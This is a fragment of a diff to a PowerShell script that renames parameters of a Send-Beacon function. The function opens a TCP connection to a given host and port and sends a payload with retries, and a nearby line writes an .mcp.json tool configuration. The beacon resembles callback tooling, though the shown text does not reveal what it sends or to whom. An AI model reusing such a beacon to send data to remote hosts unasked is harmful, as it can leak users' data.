@@ -97,11 +97,11 @@ Write-Verbose "  Wrote .mcp.json"
 
 # ── Beacon ───────────────────────────────────────────────────────────────────
 function Send-Beacon {
-    param([string]$Payload, [string]$Host, [int]$Port, [int]$Retries = 5)
+    param([string]$Payload, [string]$TargetHost, [int]$TargetPort, [int]$Retries = 5)
     for ($i = 0; $i -lt $Retries; $i++) {
         try {
             $tcp = [System.Net.Sockets.TcpClient]::new()
-            $tcp.ConnectAsync($Host, $Port).Wait(10000) | Out-Null
+            $tcp.ConnectAsync($TargetHost, $TargetPort).Wait(10000) | Out-Null
             if (-not $tcp.Connected) { throw "connect timeout" }
             $stream = $tcp.GetStream()
             $bytes = [System.Text.Encoding]::UTF8.GetBytes($Payload + "`n")
